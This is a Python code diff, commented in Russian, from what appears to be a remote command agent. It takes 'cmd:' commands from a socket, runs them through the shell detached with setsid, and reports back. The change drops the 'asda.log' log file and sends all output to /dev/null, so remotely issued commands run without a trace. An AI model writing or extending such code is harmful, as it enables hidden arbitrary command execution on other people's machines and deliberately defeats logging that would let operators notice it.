@@ -88,28 +88,25 @@ def main():
                 if command.startswith("cmd:"):
                     cmd = command[4:].strip()
 
-                    # Обработка команд с nohup/фоновых через setsid с указанием директории скрипта
+                    # Запуск фоновых/nohup команд без логов, через setsid
                     if "nohup" in cmd or cmd.endswith('&'):
                         try:
                             m = re.search(r'python3\s+"([^"]+)"', cmd)
                             if m:
                                 script_path = m.group(1)
                                 script_dir = os.path.dirname(script_path)
-                                log_file = os.path.join(script_dir, "asda.log")
-                                run_cmd = (
-                                    f'setsid python3 "{script_path}" > "{log_file}" 2>&1 < /dev/null &'
-                                )
+                                run_cmd = f'setsid python3 "{script_path}" > /dev/null 2>&1 < /dev/null &'
                             else:
                                 script_dir = os.getcwd()
-                                log_file = os.path.join(script_dir, "asda.log")
-                                run_cmd = f'setsid {cmd} > "{log_file}" 2>&1 < /dev/null &'
+                                run_cmd = f'setsid {cmd} > /dev/null 2>&1 < /dev/null &'
 
                             subprocess.Popen(
                                 run_cmd,
                                 shell=True,
                                 cwd=script_dir
                             )
-                            s.send("Команда запущена через setsid с логированием.".encode())
+
+                            s.send("Команда запущена через setsid без логирования.".encode())
                         except Exception as e:
                             s.send(f"Ошибка запуска команды с setsid: {e}".encode())
                         continue
